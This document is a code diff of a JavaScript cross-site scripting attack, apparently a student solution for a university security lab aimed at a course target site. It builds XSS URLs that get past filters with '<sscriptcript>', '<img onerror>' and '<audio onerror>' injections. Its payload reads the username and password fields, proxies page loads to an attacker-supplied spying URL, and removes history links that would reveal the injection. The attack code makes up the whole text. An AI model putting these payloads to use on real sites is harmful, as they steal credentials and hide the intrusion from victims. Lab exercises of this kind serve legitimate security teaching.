@@ -103,6 +103,8 @@ function payload(attacker) {
                 spying_url = spying_url.substr(0, spying_url.length - 1) + `?`;
                 var target = `http://bungle-cs461.csl.illinois.edu/`;
 
+                $(`a:contains(<audio), a:contains(<script)`).remove();
+
                 function loginHelper(url) {
                     var usrname = $(`#username`).val();
                     var passwd = $(`#userpass`).val();
@@ -136,7 +138,7 @@ function payload(attacker) {
 
                 $(`#new-account-btn`).click(function(e) {
                     e.preventDefault();
-                    loginHelper('create');
+                    loginHelper(`create`);
                 });
 
                 $(`#log-out-btn`).click(function(e) {
@@ -147,11 +149,6 @@ function payload(attacker) {
                         proxy(`/`, spying_url);
                     });
                 });
-
-                $(`a`).filter(`:contains(<script>)`).remove();
-                $(`a`).filter(`:contains(<sscriptcript>)`).remove();
-                $(`a`).filter(`:contains(<img)`).remove();
-                $(`a`).filter(`:contains(<audio)`).remove();
                 
                 $(`.history-item`).click(function(e) {
                     e.preventDefault();
@@ -195,16 +192,15 @@ function makeLink(target, attacker, defense) {
             // TODO: generate XSS URL for defense level 2.2.3.3
             return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
                 encodeURIComponent(
-                    "<sscriptcript>" +
+                    "<audio src='#' onerror=\"" + 
                     payload_string + 
-                    ";payload('" + attacker +"');" + 
-                    "<\/sscriptcript" + ">"
+                    ";payload('" + attacker +"');" + "\">"
                 );
         case 4:
             // TODO: generate XSS URL payload for defense level 2.2.3.4
             return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
                 encodeURIComponent(
-                    "<img src='#' onerror=\"" + 
+                    "<audio src='#' onerror=\"" + 
                     payload_string + 
                     ";payload('" + attacker +"');" + "\">"
                 );
